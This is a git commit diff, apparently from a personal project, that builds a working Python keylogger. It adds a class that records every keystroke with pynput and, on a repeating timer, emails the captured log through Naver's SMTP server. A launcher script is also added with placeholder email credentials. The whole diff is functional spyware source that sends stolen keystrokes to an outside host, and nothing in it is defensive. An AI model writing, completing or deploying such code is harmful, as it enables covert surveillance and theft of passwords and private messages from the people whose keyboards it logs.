f7f736d4476891581422660d4f918953463b23f2
0-tter <hsy157890@gmail.com>
2023-09-23 15:31:31 +0900

    End

--- H_Keylogger.py
+++ H_Keylogger.py
@@ -1,23 +1,50 @@
+import smtplib
+import threading
 import pynput.keyboard
+from email.mime.text import MIMEText
 
-log = ""
-def process_key_press(key):
-    global log
-    try:
-        log = log + str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log = log + " "
-        log = log + " " + str(key) + " "
-    print(log)
 
-def report():
-    with True:
-        sendmail
-        sleep(60)
+class Keylogger:
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger started"
+        self.interval = time_interval
+        self.email = email
+        self.password = password
 
-keyborad_listener = pynput.keyboard.Listener(on_press=process_key_press)
-with keyborad_listener:
-    keyborad_listener.join()
-    report()
+    def append_to_log(self, string):
+        self.log = self.log + string
+    def process_key_press(self, key):
+        try:
+            current_key = str(key.char)
+
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+
+        self.append_to_log(current_key)
+
+    def report(self):
+        print(self.log)
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP('smtp.naver.com', 587)
+        server.starttls()
+        server.login(email, password)
+        msg = MIMEText(message, 'plain', 'utf-8')
+        msg['From'] = email
+        msg['To'] = email
+        msg['Subject'] = 'Keylogger'
+        server.sendmail(email, email, msg.as_string())
+        server.quit()
+    def start(self):
+        keyborad_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyborad_listener:
+            self.report()
+            keyborad_listener.join()
 
---
+++ Hlogger.py
@@ -0,0 +1,4 @@
+import H_Keylogger
+
+my_keylogger = H_Keylogger.Keylogger(10, "naver_email", "naver_password")
+my_keylogger.start()
